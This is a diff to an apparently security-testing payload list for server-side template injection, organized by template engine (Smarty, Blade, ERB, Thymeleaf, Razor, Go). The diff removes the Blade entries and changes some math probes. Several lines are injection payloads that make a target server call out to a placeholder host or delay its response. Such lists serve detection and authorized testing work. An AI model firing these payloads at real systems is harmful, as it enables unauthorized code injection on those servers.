@@ -131,17 +131,6 @@ ${"java.net.URL"?new("http://{domain}/ssti").openStream()}
 ##Smarty (PHP) - OOB##
 {fetch file="http://{domain}/smarty"}
 {fetch file="http://{domain}/smarty" assign="x"}
-##Blade (PHP/Laravel) - Math##
-{{7*191}}
-{!!7*191!!}
-##Blade (PHP/Laravel) - Error##
-{{invalid}}
-{{$undefined->method()}}
-##Blade (PHP/Laravel) - Timing##
-@php sleep(5); @endphp
-##Blade (PHP/Laravel) - OOB##
-@php file_get_contents('http://{domain}/blade') @endphp
-@php fopen('http://{domain}/blade','r') @endphp
 ##ERB (Ruby) - Math##
 <%=7*191%>
 <%= 7 * 191 %>
@@ -179,7 +168,7 @@ ${"java.net.URL"?new("http://{domain}/ssti").openStream()}
 {{invalid | no_such_filter}}
 ##Thymeleaf (Java) - Math##
 [[${7*191}]]
-[[${T(java.lang.Math).abs(-1337)}]]
+[[${T(java.lang.Math).multiplyExact(7,191)}]]
 *{7*191}
 ##Thymeleaf (Java) - Error##
 [[${T(invalid).method()}]]
@@ -210,8 +199,8 @@ ${"java.net.URL"?new("http://{domain}/ssti").openStream()}
 @{new System.Net.WebClient().DownloadString("http://{domain}/razor");}
 @{new System.Net.Http.HttpClient().GetStringAsync("http://{domain}/razor").Result;}
 ##Go text/template - Math##
-{{printf "%d" 1337}}
-{{html 1337}}
+{{multiply 7 191}}
+{{add 1336 1}}
 ##Go text/template - Error##
 {{.Invalid}}
 {{template "nonexistent"}}
